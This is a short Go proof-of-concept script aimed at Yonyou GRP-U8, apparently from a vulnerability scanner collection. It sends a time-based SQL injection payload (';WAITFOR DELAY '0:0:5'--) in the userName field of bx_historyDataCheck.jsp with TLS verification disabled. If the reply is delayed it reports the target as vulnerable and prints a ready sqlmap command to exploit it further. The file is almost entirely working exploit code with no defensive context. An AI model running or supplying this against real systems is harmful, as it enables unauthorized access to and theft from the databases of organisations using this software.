package poc

import (
	"bytes"
	"crypto/tls"
	"log"
	"net/http"
	"strings"
	"time"
)

func GRP_U8Datachecksqli(target string) {
	url := strings.TrimRight(target, "/")
	startTime := time.Now()
	data := "userName=';WAITFOR DELAY '0:0:5'--&ysnd=&historyFlag="
	req, err := http.NewRequest("POST", url+"/u8qx/bx_historyDataCheck.jsp", bytes.NewBufferString(data))
	if err != nil {
		log.Println(err)
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		elapsed := time.Since(startTime)
		elapsedSeconds := elapsed.Seconds()
		if elapsedSeconds >= 5 {
			log.Println("[+] 存在用友GRP-U8 bx_historyDataCheck SQL注入漏洞")
			log.Println("[+] sqlmap命令：sqlmap.py -u \"" + url + "/u8qx/bx_historyDataCheck.jsp" + "\" --data \"userName=1*\" --time-sec 5 --random-agent --hex")
		} else {
			log.Println("[-] 不存在用友GRP-U8 bx_historyDataCheck SQL注入漏洞")
		}
	}
}
